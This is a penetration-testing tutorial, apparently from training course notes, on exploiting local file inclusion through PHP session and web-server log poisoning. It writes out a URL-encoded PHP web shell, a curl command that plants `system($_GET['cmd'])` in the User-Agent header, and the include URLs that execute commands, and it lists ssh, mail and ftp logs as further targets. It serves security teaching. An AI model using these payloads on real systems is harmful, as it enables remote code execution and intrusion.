# Log Poisoning
The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.

For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

As was the case in the previous section, any of the following functions with `Execute` privileges should be vulnerable to these attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

## PHP Session Poisoning
Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. 

These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. 

The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. 

For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session through Developer Tools - Storage section.

In this case, `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. 

Let's try include this session file through the LFI vulnerability and view its contents:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_urojeq9b2mda1m7sl87gvbm5t4
```

In this case, we see 2 values: `page`, which shows the selected language page, and `preference`, which shows the selected language. 

The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.

Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_urojeq9b2mda1m7sl87gvbm5t4
```

This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file.

Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the `&cmd=id` to execute a commands:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_urojeq9b2mda1m7sl87gvbm5t4&cmd=id
```
> Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion.
## Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

Let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header.
- We can control the `User=Agent` header through HTTP requests, so we can poison this.

To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`: ![HTTP request and response showing Apache log poisoning with PHP notice about an undefined variable.](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

We may also poison the log by sending a request through cURL, as follows:
```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
```
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`): ![HTTP request and response showing Apache log poisoning with PHP code execution using system command.](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

We see that we successfully executed the command. The exact same attack can be carried out on `Nginx` logs as well.
## Extra Notes
Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.
